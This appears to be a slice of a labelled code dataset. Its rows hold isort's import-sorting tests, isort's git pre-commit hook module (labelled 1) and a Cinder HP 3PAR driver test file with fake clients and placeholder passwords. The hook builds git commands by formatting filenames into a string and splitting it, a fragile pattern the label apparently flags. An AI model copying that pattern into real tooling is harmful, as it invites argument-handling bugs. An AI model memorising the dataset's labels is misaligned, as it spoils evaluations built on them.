                           'from a import b as c\n'
                           'from a import b as d\n'
                           'from a import z, x, y, w\n'
                           'from a import i as j\n'
                           'from a import g as h\n'
                           'from a import e as f\n')
    test_output = SortImports(file_contents=test_input, combine_star=True, combine_as_imports=True,
                              keep_direct_and_as_imports=False, force_single_line=False, no_inline_sort=False).output
    assert test_output == 'import a\nfrom a import *\n'
    test_output = SortImports(file_contents=test_input, combine_star=True, combine_as_imports=False,
                              keep_direct_and_as_imports=True, force_single_line=False, no_inline_sort=False).output
    assert test_output == 'import a\nfrom a import *\n'
    test_output = SortImports(file_contents=test_input, combine_star=True, combine_as_imports=False,
                              keep_direct_and_as_imports=False, force_single_line=True, no_inline_sort=False).output
    assert test_output == 'import a\nfrom a import *\n'
    test_output = SortImports(file_contents=test_input, combine_star=True, combine_as_imports=False,
                              keep_direct_and_as_imports=False, force_single_line=False, no_inline_sort=True).output
    assert test_output == 'import a\nfrom a import *\n'
    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=True,
                              keep_direct_and_as_imports=True, force_single_line=False, no_inline_sort=False).output
    assert test_output == ('import a\n'
                           'from a import *\n'
                           'from a import b, b as c, b as d, e as f, g as h, i as j, w, x, y, z\n')
    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=True,
                              keep_direct_and_as_imports=False, force_single_line=True, no_inline_sort=False).output
    assert test_output == ('import a\n'
                           'from a import *\n'
                           'from a import b as c\n'
                           'from a import b as d\n'
                           'from a import e as f\n'
                           'from a import g as h\n'
                           'from a import i as j\n'
                           'from a import w\n'
                           'from a import x\n'
                           'from a import y\n'
                           'from a import z\n')
    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=True,
                              keep_direct_and_as_imports=False, force_single_line=False, no_inline_sort=True).output
    assert test_output == ('import a\n'
                           'from a import *\n'
                           'from a import b as d, b as c, z, x, y, w, i as j, g as h, e as f\n')
    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=False,
                              keep_direct_and_as_imports=True, force_single_line=True, no_inline_sort=False).output
    assert test_output == ('import a\n'
                           'from a import *\n'
                           'from a import b\n'
                           'from a import b as c\n'
                           'from a import b as d\n'
                           'from a import e as f\n'
                           'from a import g as h\n'
                           'from a import i as j\n'
                           'from a import w\n'
                           'from a import x\n'
                           'from a import y\n'
                           'from a import z\n')
    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=False,
                              keep_direct_and_as_imports=True, force_single_line=False, no_inline_sort=True).output
    assert test_output == ('import a\n'
                           'from a import *\n'
                           'from a import b\n'
                           'from a import b as c\n'
                           'from a import b as d\n'
                           'from a import z, x, y, w\n'
                           'from a import i as j\n'
                           'from a import g as h\n'
                           'from a import e as f\n')
    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=False,
                              keep_direct_and_as_imports=False, force_single_line=True, no_inline_sort=True).output
    assert test_output == ('import a\n'
                           'from a import *\n'
                           'from a import b as c\n'
                           'from a import b as d\n'
                           'from a import e as f\n'
                           'from a import g as h\n'
                           'from a import i as j\n'
                           'from a import w\n'
                           'from a import x\n'
                           'from a import y\n'
                           'from a import z\n')
    test_output = SortImports(file_contents=test_input, combine_star=True, combine_as_imports=True,
                              keep_direct_and_as_imports=True, force_single_line=False, no_inline_sort=False).output
    assert test_output == 'import a\nfrom a import *\n'
    test_output = SortImports(file_contents=test_input, combine_star=True, combine_as_imports=True,
                              keep_direct_and_as_imports=False, force_single_line=True, no_inline_sort=False).output
    assert test_output == 'import a\nfrom a import *\n'
    test_output = SortImports(file_contents=test_input, combine_star=True, combine_as_imports=True,
                              keep_direct_and_as_imports=False, force_single_line=False, no_inline_sort=True).output
    assert test_output == 'import a\nfrom a import *\n'
    test_output = SortImports(file_contents=test_input, combine_star=True, combine_as_imports=False,
                              keep_direct_and_as_imports=True, force_single_line=True, no_inline_sort=False).output
    assert test_output == 'import a\nfrom a import *\n'
    test_output = SortImports(file_contents=test_input, combine_star=True, combine_as_imports=False,
                              keep_direct_and_as_imports=True, force_single_line=False, no_inline_sort=True).output
    assert test_output == 'import a\nfrom a import *\n'
    test_output = SortImports(file_contents=test_input, combine_star=True, combine_as_imports=False,
                              keep_direct_and_as_imports=False, force_single_line=True, no_inline_sort=True).output
    assert test_output == 'import a\nfrom a import *\n'
    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=True,
                              keep_direct_and_as_imports=True, force_single_line=True, no_inline_sort=False).output
    assert test_output == ('import a\n'
                           'from a import *\n'
                           'from a import b\n'
                           'from a import b as c\n'
                           'from a import b as d\n'
                           'from a import e as f\n'
                           'from a import g as h\n'
                           'from a import i as j\n'
                           'from a import w\n'
                           'from a import x\n'
                           'from a import y\n'
                           'from a import z\n')
    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=True,
                              keep_direct_and_as_imports=True, force_single_line=False, no_inline_sort=True).output
    assert test_output == ('import a\n'
                           'from a import *\n'
                           'from a import b, b as d, b as c, z, x, y, w, i as j, g as h, e as f\n')
    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=False,
                              keep_direct_and_as_imports=True, force_single_line=True, no_inline_sort=True).output
    assert test_output == ('import a\n'
                           'from a import *\n'
                           'from a import b\n'
                           'from a import b as c\n'
                           'from a import b as d\n'
                           'from a import e as f\n'
                           'from a import g as h\n'
                           'from a import i as j\n'
                           'from a import w\n'
                           'from a import x\n'
                           'from a import y\n'
                           'from a import z\n')
    test_output = SortImports(file_contents=test_input, combine_star=True, combine_as_imports=True,
                              keep_direct_and_as_imports=True, force_single_line=True, no_inline_sort=False).output
    assert test_output == 'import a\nfrom a import *\n'


def test_noqa_issue_679():
    # Test to ensure that NOQA notation is being observed as expected
    test_input = ('import os\n'
                  '\n'
                  'import requestsss\n'
                  'import zed # NOQA\n'
                  'import ujson # NOQA\n'
                  '\n'
                  'import foo')
    test_output = ('import os\n'
                   '\n'
                   'import foo\n'
                   'import requestsss\n'
                   '\n'
                   'import zed # NOQA\n'
                   'import ujson # NOQA\n')
    assert SortImports(file_contents=test_input).output == test_output


def test_extract_multiline_output_wrap_setting_from_a_config_file(tmpdir: py.path.local) -> None:
    editorconfig_contents = [
        'root = true',
        ' [*.py]',
        'multi_line_output = 5'
    ]
    config_file = tmpdir.join('.editorconfig')
    config_file.write('\n'.join(editorconfig_contents))

    config = settings.from_path(str(tmpdir))
    assert config['multi_line_output'] == WrapModes.VERTICAL_GRID_GROUPED


def test_ensure_support_for_non_typed_but_cased_alphabetic_sort_issue_890():
    test_input = ('from pkg import BALL\n'
                  'from pkg import RC\n'
                  'from pkg import Action\n'
                  'from pkg import Bacoo\n'
                  'from pkg import RCNewCode\n'
                  'from pkg import actual\n'
                  'from pkg import rc\n'
                  'from pkg import recorder\n')
    expected_output = ('from pkg import Action\n'
                       'from pkg import BALL\n'
                       'from pkg import Bacoo\n'
                       'from pkg import RC\n'
                       'from pkg import RCNewCode\n'
                       'from pkg import actual\n'
                       'from pkg import rc\n'
                       'from pkg import recorder\n')
    assert SortImports(file_contents=test_input, case_sensitive=True, order_by_type=False,
                       force_single_line=True).output == expected_output


def test_to_ensure_empty_line_not_added_to_file_start_issue_889():
    test_input = ('# comment\n'
                  'import os\n'
                  '# comment2\n'
                  'import sys\n')
    assert SortImports(file_contents=test_input).output == test_input


def test_to_ensure_correctly_handling_of_whitespace_only_issue_811(capsys):
    test_input = ('import os\n'
                  'import sys\n'
                  '\n'
                  '\x0c\n'
                  'def my_function():\n'
                  '    print(""hi"")\n')
    SortImports(file_contents=test_input, ignore_whitespace=True)
    out, err = capsys.readouterr()
    assert out == ''
    assert err == ''


def test_standard_library_deprecates_user_issue_778():
    test_input = ('import os\n'
                  '\n'
                  'import user\n')
    assert SortImports(file_contents=test_input).output == test_input


def test_settings_path_skip_issue_909(tmpdir):
    base_dir = tmpdir.mkdir('project')
    config_dir = base_dir.mkdir('conf')
    config_dir.join('.isort.cfg').write('[isort]\n'
                                        'skip =\n'
                                        '    file_to_be_skipped.py\n'
                                        'skip_glob =\n'
                                        '    *glob_skip*\n')

    base_dir.join('file_glob_skip.py').write('import os\n'
                                             '\n'
                                             'print(""Hello World"")\n'
                                             '\n'
                                             'import sys\n')
    base_dir.join('file_to_be_skipped.py').write('import os\n'
                                                 '\n'
                                                 'print(""Hello World"")'
                                                 '\n'
                                                 'import sys\n')

    test_run_directory = os.getcwd()
    os.chdir(str(base_dir))
    with pytest.raises(Exception):  # without the settings path provided: the command should not skip & identify errors
        subprocess.run(['isort', '--check-only'], check=True)
    result = subprocess.run(
        ['isort', '--check-only', '--settings-path=conf/.isort.cfg'],
        stdout=subprocess.PIPE,
        check=True
    )
    os.chdir(str(test_run_directory))

    assert b'skipped 2' in result.stdout.lower()


def test_skip_paths_issue_938(tmpdir):
    base_dir = tmpdir.mkdir('project')
    config_dir = base_dir.mkdir('conf')
    config_dir.join('.isort.cfg').write('[isort]\n'
                                        'line_length = 88\n'
                                        'multi_line_output = 4\n'
                                        'lines_after_imports = 2\n'
                                        'skip_glob =\n'
                                        '    migrations/**.py\n')
    base_dir.join('dont_skip.py').write('import os\n'
                                        '\n'
                                        'print(""Hello World"")'
                                        '\n'
                                        'import sys\n')

    migrations_dir = base_dir.mkdir('migrations')
    migrations_dir.join('file_glob_skip.py').write('import os\n'
                                                   '\n'
                                                   'print(""Hello World"")\n'
                                                   '\n'
                                                   'import sys\n')

    test_run_directory = os.getcwd()
    os.chdir(str(base_dir))
    result = subprocess.run(
        ['isort', 'dont_skip.py', 'migrations/file_glob_skip.py'],
        stdout=subprocess.PIPE,
        check=True,
    )
    os.chdir(str(test_run_directory))

    assert b'skipped' not in result.stdout.lower()

    os.chdir(str(base_dir))
    result = subprocess.run(
        ['isort', '--filter-files', '--settings-path=conf/.isort.cfg', 'dont_skip.py', 'migrations/file_glob_skip.py'],
        stdout=subprocess.PIPE,
        check=True,
    )
    os.chdir(str(test_run_directory))

    assert b'skipped 1' in result.stdout.lower()


def test_failing_file_check_916():
    test_input = ('#!/usr/bin/env python\n'
                  '# -*- coding: utf-8 -*-\n'
                  'from __future__ import unicode_literals\n')
    expected_output = ('#!/usr/bin/env python\n'
                       '# -*- coding: utf-8 -*-\n'
                       '# FUTURE\n'
                       'from __future__ import unicode_literals\n')
    settings = {'known_future_library': 'future',
                'import_heading_future': 'FUTURE',
                'sections': ['FUTURE', 'STDLIB', 'NORDIGEN', 'FIRSTPARTY', 'THIRDPARTY', 'LOCALFOLDER'],
                'indent': '    ',
                'multi_line_output': 3,
                'lines_after_imports': 2}  # type: Dict[str, Any]
    assert SortImports(file_contents=test_input, **settings).output == expected_output
    assert SortImports(file_contents=expected_output, **settings).output == expected_output
    assert not SortImports(file_contents=expected_output, check=True, **settings).incorrectly_sorted


def test_import_heading_issue_905():
    config = {'import_heading_stdlib': 'Standard library imports',
              'import_heading_thirdparty': 'Third party imports',
              'import_heading_firstparty': 'Local imports',
              'known_third_party': ['numpy'],
              'known_first_party': ['oklib']}  # type: Dict[str, Any]
    test_input = ('# Standard library imports\n'
                  'import os.path as osp\n'
                  '\n'
                  '# Third party imports\n'
                  'import numpy as np\n'
                  '\n'
                  '# Local imports\n'
                  'from oklib.plot_ok import imagesc\n')
    assert SortImports(file_contents=test_input, **config).output == test_input


def test_isort_keeps_comments_issue_691():
    test_input = ('import os\n'
                  '# This will make sure the app is always imported when\n'
                  '# Django starts so that shared_task will use this app.\n'
                  'from .celery import app as celery_app  # noqa\n'
                  '\n'
                  'PROJECT_DIR = os.path.dirname(os.path.abspath(__file__))\n'
                  '\n'
                  'def path(*subdirectories):\n'
                  '    return os.path.join(PROJECT_DIR, *subdirectories)\n')
    expected_output = ('import os\n'
                       '\n'
                       '# This will make sure the app is always imported when\n'
                       '# Django starts so that shared_task will use this app.\n'
                       'from .celery import app as celery_app  # noqa\n'
                       '\n'
                       'PROJECT_DIR = os.path.dirname(os.path.abspath(__file__))\n'
                       '\n'
                       'def path(*subdirectories):\n'
                       '    return os.path.join(PROJECT_DIR, *subdirectories)\n')
    assert SortImports(file_contents=test_input).output == expected_output


def test_pyi_formatting_issue_942(tmpdir):
    test_input = ('import os\n'
                  '\n'
                  '\n'
                  'def my_method():\n')
    expected_py_output = test_input.splitlines()
    expected_pyi_output = ('import os\n'
                           '\n'
                           'def my_method():\n').splitlines()
    assert SortImports(file_contents=test_input).output.splitlines() == expected_py_output
    assert SortImports(file_contents=test_input,
                       extension=""pyi"").output.splitlines() == expected_pyi_output

    source_py = tmpdir.join('source.py')
    source_py.write(test_input)
    assert SortImports(file_path=str(source_py)).output.splitlines() == expected_py_output

    source_pyi = tmpdir.join('source.pyi')
    source_pyi.write(test_input)
    assert SortImports(file_path=str(source_pyi)).output.splitlines() == expected_pyi_output


def test_python_version():
    from isort.main import parse_args

    # test that the py_version can be added as flag
    args = parse_args(['-py=2.7'])
    assert args[""py_version""] == ""2.7""

    args = parse_args(['--python-version=3'])
    assert args[""py_version""] == ""3""

    test_input = ('import os\n'
                  '\n'
                  'import user\n')
    assert SortImports(file_contents=test_input, py_version=""3"").output == test_input

    # user is part of the standard library in python 2
    output_python_2 = ('import os\n'
                       'import user\n')
    assert SortImports(file_contents=test_input, py_version=""2.7"").output == output_python_2

    test_input = ('import os\nimport xml')

    print(SortImports(file_contents=test_input, py_version=""all"").output )
/n/n/n",0
197,197,1ab38f4f7840a3c19bf961a24630a992a8373a76,"/isort/hooks.py/n/n""""""isort.py.

Defines a git hook to allow pre-commit warnings and errors about import order.

usage:
    exit_code = git_hook(strict=True|False, modify=True|False)

Copyright (C) 2015  Helen Sherwood-Taylor

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated
documentation files (the ""Software""), to deal in the Software without restriction, including without limitation
the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and
to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or
substantial portions of the Software.

THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED
TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL
THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF
CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
OTHER DEALINGS IN THE SOFTWARE.

""""""
import subprocess
from typing import List

from isort import SortImports


def get_output(command: str) -> bytes:
    """"""
    Run a command and return raw output

    :param str command: the command to run
    :returns: the stdout output of the command
    """"""
    return subprocess.check_output(command.split())


def get_lines(command: str) -> List[str]:
    """"""
    Run a command and return lines of output

    :param str command: the command to run
    :returns: list of whitespace-stripped lines output by command
    """"""
    stdout = get_output(command)
    return [line.strip().decode() for line in stdout.splitlines()]


def git_hook(strict=False, modify=False):
    """"""
    Git pre-commit hook to check staged files for isort errors

    :param bool strict - if True, return number of errors on exit,
        causing the hook to fail. If False, return zero so it will
        just act as a warning.
    :param bool modify - if True, fix the sources if they are not
        sorted properly. If False, only report result without
        modifying anything.

    :return number of errors if in strict mode, 0 otherwise.
    """"""

    # Get list of files modified and staged
    diff_cmd = ""git diff-index --cached --name-only --diff-filter=ACMRTUXB HEAD""
    files_modified = get_lines(diff_cmd)

    errors = 0
    for filename in files_modified:
        if filename.endswith('.py'):
            # Get the staged contents of the file
            staged_cmd = ""git show :%s"" % filename
            staged_contents = get_output(staged_cmd)

            sort = SortImports(
                file_path=filename,
                file_contents=staged_contents.decode(),
                check=True
            )

            if sort.incorrectly_sorted:
                errors += 1
                if modify:
                    SortImports(
                        file_path=filename,
                        file_contents=staged_contents.decode(),
                        check=False,
                    )

    return errors if strict else 0
/n/n/n",1
76,76,c55589b131828f3a595903f6796cb2d0babb772f,"cinder/tests/test_hp3par.py/n/n#!/usr/bin/env python
# vim: tabstop=4 shiftwidth=4 softtabstop=4
#
#    (c) Copyright 2013 Hewlett-Packard Development Company, L.P.
#    All Rights Reserved.
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
""""""
Unit tests for OpenStack Cinder volume drivers
""""""
import ast
import mox
import shutil
import tempfile

from hp3parclient import exceptions as hpexceptions

from cinder import exception
from cinder.openstack.common import log as logging
from cinder import test
from cinder.volume import configuration as conf
from cinder.volume.drivers.san.hp import hp_3par_fc as hpfcdriver
from cinder.volume.drivers.san.hp import hp_3par_iscsi as hpdriver

LOG = logging.getLogger(__name__)

HP3PAR_DOMAIN = 'OpenStack',
HP3PAR_CPG = 'OpenStackCPG',
HP3PAR_CPG_SNAP = 'OpenStackCPGSnap'
CLI_CR = '\r\n'


class FakeHP3ParClient(object):

    api_url = None
    debug = False

    volumes = []
    hosts = []
    vluns = []
    cpgs = [
        {'SAGrowth': {'LDLayout': {'diskPatterns': [{'diskType': 2}]},
                      'incrementMiB': 8192},
         'SAUsage': {'rawTotalMiB': 24576,
                     'rawUsedMiB': 768,
                     'totalMiB': 8192,
                     'usedMiB': 256},
         'SDGrowth': {'LDLayout': {'RAIDType': 4,
                      'diskPatterns': [{'diskType': 2}]},
                      'incrementMiB': 32768},
         'SDUsage': {'rawTotalMiB': 49152,
                     'rawUsedMiB': 1023,
                     'totalMiB': 36864,
                     'usedMiB': 768},
         'UsrUsage': {'rawTotalMiB': 57344,
                      'rawUsedMiB': 43349,
                      'totalMiB': 43008,
                      'usedMiB': 32512},
         'additionalStates': [],
         'degradedStates': [],
         'domain': HP3PAR_DOMAIN,
         'failedStates': [],
         'id': 5,
         'name': HP3PAR_CPG,
         'numFPVVs': 2,
         'numTPVVs': 0,
         'state': 1,
         'uuid': '29c214aa-62b9-41c8-b198-543f6cf24edf'}]

    def __init__(self, api_url):
        self.api_url = api_url
        self.volumes = []
        self.hosts = []
        self.vluns = []

    def debug_rest(self, flag):
        self.debug = flag

    def login(self, username, password, optional=None):
        return None

    def logout(self):
        return None

    def getVolumes(self):
        return self.volumes

    def getVolume(self, name):
        if self.volumes:
            for volume in self.volumes:
                if volume['name'] == name:
                    return volume

        msg = {'code': 'NON_EXISTENT_HOST',
               'desc': ""VOLUME '%s' was not found"" % name}
        raise hpexceptions.HTTPNotFound(msg)

    def createVolume(self, name, cpgName, sizeMiB, optional=None):
        new_vol = {'additionalStates': [],
                   'adminSpace': {'freeMiB': 0,
                                  'rawReservedMiB': 384,
                                  'reservedMiB': 128,
                                  'usedMiB': 128},
                   'baseId': 115,
                   'comment': optional['comment'],
                   'copyType': 1,
                   'creationTime8601': '2012-10-22T16:37:57-07:00',
                   'creationTimeSec': 1350949077,
                   'degradedStates': [],
                   'domain': HP3PAR_DOMAIN,
                   'failedStates': [],
                   'id': 115,
                   'name': name,
                   'policies': {'caching': True,
                                'oneHost': False,
                                'staleSS': True,
                                'system': False,
                                'zeroDetect': False},
                   'provisioningType': 1,
                   'readOnly': False,
                   'sizeMiB': sizeMiB,
                   'snapCPG': optional['snapCPG'],
                   'snapshotSpace': {'freeMiB': 0,
                                     'rawReservedMiB': 683,
                                     'reservedMiB': 512,
                                     'usedMiB': 512},
                   'ssSpcAllocLimitPct': 0,
                   'ssSpcAllocWarningPct': 0,
                   'state': 1,
                   'userCPG': cpgName,
                   'userSpace': {'freeMiB': 0,
                                 'rawReservedMiB': 41984,
                                 'reservedMiB': 31488,
                                 'usedMiB': 31488},
                   'usrSpcAllocLimitPct': 0,
                   'usrSpcAllocWarningPct': 0,
                   'uuid': '1e7daee4-49f4-4d07-9ab8-2b6a4319e243',
                   'wwn': '50002AC00073383D'}
        self.volumes.append(new_vol)
        return None

    def deleteVolume(self, name):
        volume = self.getVolume(name)
        self.volumes.remove(volume)

    def createSnapshot(self, name, copyOfName, optional=None):
        new_snap = {'additionalStates': [],
                    'adminSpace': {'freeMiB': 0,
                                   'rawReservedMiB': 0,
                                   'reservedMiB': 0,
                                   'usedMiB': 0},
                    'baseId': 342,
                    'comment': optional['comment'],
                    'copyOf': copyOfName,
                    'copyType': 3,
                    'creationTime8601': '2012-11-09T15:13:28-08:00',
                    'creationTimeSec': 1352502808,
                    'degradedStates': [],
                    'domain': HP3PAR_DOMAIN,
                    'expirationTime8601': '2012-11-09T17:13:28-08:00',
                    'expirationTimeSec': 1352510008,
                    'failedStates': [],
                    'id': 343,
                    'name': name,
                    'parentId': 342,
                    'policies': {'caching': True,
                                 'oneHost': False,
                                 'staleSS': True,
                                 'system': False,
                                 'zeroDetect': False},
                    'provisioningType': 3,
                    'readOnly': True,
                    'retentionTime8601': '2012-11-09T16:13:27-08:00',
                    'retentionTimeSec': 1352506407,
                    'sizeMiB': 256,
                    'snapCPG': HP3PAR_CPG_SNAP,
                    'snapshotSpace': {'freeMiB': 0,
                                      'rawReservedMiB': 0,
                                      'reservedMiB': 0,
                                      'usedMiB': 0},
                    'ssSpcAllocLimitPct': 0,
                    'ssSpcAllocWarningPct': 0,
                    'state': 1,
                    'userCPG': HP3PAR_CPG,
                    'userSpace': {'freeMiB': 0,
                                  'rawReservedMiB': 0,
                                  'reservedMiB': 0,
                                  'usedMiB': 0},
                    'usrSpcAllocLimitPct': 0,
                    'usrSpcAllocWarningPct': 0,
                    'uuid': 'd7a40b8f-2511-46a8-9e75-06383c826d19',
                    'wwn': '50002AC00157383D'}
        self.volumes.append(new_snap)
        return None

    def deleteSnapshot(self, name):
        volume = self.getVolume(name)
        self.volumes.remove(volume)

    def createCPG(self, name, optional=None):
        cpg = {'SAGrowth': {'LDLayout': {'diskPatterns': [{'diskType': 2}]},
                            'incrementMiB': 8192},
               'SAUsage': {'rawTotalMiB': 24576,
                           'rawUsedMiB': 768,
                           'totalMiB': 8192,
                           'usedMiB': 256},
               'SDGrowth': {'LDLayout': {'RAIDType': 4,
                            'diskPatterns': [{'diskType': 2}]},
                            'incrementMiB': 32768},
               'SDUsage': {'rawTotalMiB': 49152,
                           'rawUsedMiB': 1023,
                           'totalMiB': 36864,
                           'usedMiB': 768},
               'UsrUsage': {'rawTotalMiB': 57344,
                            'rawUsedMiB': 43349,
                            'totalMiB': 43008,
                            'usedMiB': 32512},
               'additionalStates': [],
               'degradedStates': [],
               'domain': HP3PAR_DOMAIN,
               'failedStates': [],
               'id': 1,
               'name': name,
               'numFPVVs': 2,
               'numTPVVs': 0,
               'state': 1,
               'uuid': '29c214aa-62b9-41c8-b198-000000000000'}

        new_cpg = cpg.copy()
        new_cpg.update(optional)
        self.cpgs.append(new_cpg)

    def getCPGs(self):
        return self.cpgs

    def getCPG(self, name):
        if self.cpgs:
            for cpg in self.cpgs:
                if cpg['name'] == name:
                    return cpg

        msg = {'code': 'NON_EXISTENT_HOST',
               'desc': ""CPG '%s' was not found"" % name}
        raise hpexceptions.HTTPNotFound(msg)

    def deleteCPG(self, name):
        cpg = self.getCPG(name)
        self.cpgs.remove(cpg)

    def createVLUN(self, volumeName, lun, hostname=None,
                   portPos=None, noVcn=None,
                   overrideLowerPriority=None):

        vlun = {'active': False,
                'failedPathInterval': 0,
                'failedPathPol': 1,
                'hostname': hostname,
                'lun': lun,
                'multipathing': 1,
                'portPos': portPos,
                'type': 4,
                'volumeName': volumeName,
                'volumeWWN': '50002AC00077383D'}
        self.vluns.append(vlun)
        return None

    def deleteVLUN(self, name, lunID, hostname=None, port=None):
        vlun = self.getVLUN(name)
        self.vluns.remove(vlun)

    def getVLUNs(self):
        return self.vluns

    def getVLUN(self, volumeName):
        for vlun in self.vluns:
            if vlun['volumeName'] == volumeName:
                return vlun

        msg = {'code': 'NON_EXISTENT_HOST',
               'desc': ""VLUN '%s' was not found"" % volumeName}
        raise hpexceptions.HTTPNotFound(msg)


class HP3PARBaseDriver():

    VOLUME_ID = ""d03338a9-9115-48a3-8dfc-35cdfcdc15a7""
    CLONE_ID = ""d03338a9-9115-48a3-8dfc-000000000000""
    VOLUME_NAME = ""volume-d03338a9-9115-48a3-8dfc-35cdfcdc15a7""
    SNAPSHOT_ID = ""2f823bdc-e36e-4dc8-bd15-de1c7a28ff31""
    SNAPSHOT_NAME = ""snapshot-2f823bdc-e36e-4dc8-bd15-de1c7a28ff31""
    VOLUME_3PAR_NAME = ""osv-0DM4qZEVSKON-DXN-NwVpw""
    SNAPSHOT_3PAR_NAME = ""oss-L4I73ONuTci9Fd4ceij-MQ""
    FAKE_HOST = ""fakehost""
    USER_ID = '2689d9a913974c008b1d859013f23607'
    PROJECT_ID = 'fac88235b9d64685a3530f73e490348f'
    VOLUME_ID_SNAP = '761fc5e5-5191-4ec7-aeba-33e36de44156'
    FAKE_DESC = 'test description name'
    FAKE_FC_PORTS = ['0987654321234', '123456789000987']
    QOS = {'qos:maxIOPS': '1000', 'qos:maxBWS': '50'}
    VVS_NAME = ""myvvs""
    FAKE_ISCSI_PORTS = {'1.1.1.2': {'nsp': '8:1:1',
                                    'iqn': ('iqn.2000-05.com.3pardata:'
                                            '21810002ac00383d'),
                                    'ip_port': '3262'}}

    volume = {'name': VOLUME_NAME,
              'id': VOLUME_ID,
              'display_name': 'Foo Volume',
              'size': 2,
              'host': FAKE_HOST,
              'volume_type': None,
              'volume_type_id': None}

    volume_qos = {'name': VOLUME_NAME,
                  'id': VOLUME_ID,
                  'display_name': 'Foo Volume',
                  'size': 2,
                  'host': FAKE_HOST,
                  'volume_type': None,
                  'volume_type_id': 'gold'}

    snapshot = {'name': SNAPSHOT_NAME,
                'id': SNAPSHOT_ID,
                'user_id': USER_ID,
                'project_id': PROJECT_ID,
                'volume_id': VOLUME_ID_SNAP,
                'volume_name': VOLUME_NAME,
                'status': 'creating',
                'progress': '0%',
                'volume_size': 2,
                'display_name': 'fakesnap',
                'display_description': FAKE_DESC}

    connector = {'ip': '10.0.0.2',
                 'initiator': 'iqn.1993-08.org.debian:01:222',
                 'wwpns': [""123456789012345"", ""123456789054321""],
                 'wwnns': [""223456789012345"", ""223456789054321""],
                 'host': 'fakehost'}

    volume_type = {'name': 'gold',
                   'deleted': False,
                   'updated_at': None,
                   'extra_specs': {'qos:maxBWS': '50',
                                   'qos:maxIOPS': '1000'},
                   'deleted_at': None,
                   'id': 'gold'}

    def setup_configuration(self):
        configuration = mox.MockObject(conf.Configuration)
        configuration.hp3par_debug = False
        configuration.hp3par_username = 'testUser'
        configuration.hp3par_password = 'testPassword'
        configuration.hp3par_api_url = 'https://1.1.1.1/api/v1'
        configuration.hp3par_domain = HP3PAR_DOMAIN
        configuration.hp3par_cpg = HP3PAR_CPG
        configuration.hp3par_cpg_snap = HP3PAR_CPG_SNAP
        configuration.iscsi_ip_address = '1.1.1.2'
        configuration.iscsi_port = '1234'
        configuration.san_ip = '2.2.2.2'
        configuration.san_login = 'test'
        configuration.san_password = 'test'
        configuration.hp3par_snapshot_expiration = """"
        configuration.hp3par_snapshot_retention = """"
        configuration.hp3par_iscsi_ips = []
        return configuration

    def setup_fakes(self):
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_create_client"",
                       self.fake_create_client)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_set_connections"",
                       self.fake_set_connections)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_get_3par_host"",
                       self.fake_get_3par_host)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_delete_3par_host"",
                       self.fake_delete_3par_host)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_create_3par_vlun"",
                       self.fake_create_3par_vlun)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_ports"",
                       self.fake_get_ports)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_cpg"",
                       self.fake_get_cpg)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,
                       ""get_volume_settings_from_type"",
                       self.fake_get_volume_settings_from_type)
        self.stubs.Set(hpfcdriver.hpcommon.HP3PARCommon, ""get_domain"",
                       self.fake_get_domain)

    def clear_mox(self):
        self.mox.ResetAll()
        self.stubs.UnsetAll()

    def fake_create_client(self):
        return FakeHP3ParClient(self.driver.configuration.hp3par_api_url)

    def fake_get_cpg(self, volume, allowSnap=False):
        return HP3PAR_CPG

    def fake_set_connections(self):
        return

    def fake_get_domain(self, cpg):
        return HP3PAR_DOMAIN

    def fake_extend_volume(self, volume, new_size):
        vol = self.driver.common.client.getVolume(volume['name'])
        old_size = vol['sizeMiB']
        option = {'comment': vol['comment'], 'snapCPG': vol['snapCPG']}
        self.driver.common.client.deleteVolume(volume['name'])
        self.driver.common.client.createVolume(vol['name'],
                                               vol['userCPG'],
                                               new_size, option)

    def fake_get_3par_host(self, hostname):
        if hostname not in self._hosts:
            msg = {'code': 'NON_EXISTENT_HOST',
                   'desc': ""HOST '%s' was not found"" % hostname}
            raise hpexceptions.HTTPNotFound(msg)
        else:
            return self._hosts[hostname]

    def fake_delete_3par_host(self, hostname):
        if hostname not in self._hosts:
            msg = {'code': 'NON_EXISTENT_HOST',
                   'desc': ""HOST '%s' was not found"" % hostname}
            raise hpexceptions.HTTPNotFound(msg)
        else:
            del self._hosts[hostname]

    def fake_create_3par_vlun(self, volume, hostname):
        self.driver.common.client.createVLUN(volume, 19, hostname)

    def fake_get_ports(self):
        return {'FC': self.FAKE_FC_PORTS, 'iSCSI': self.FAKE_ISCSI_PORTS}

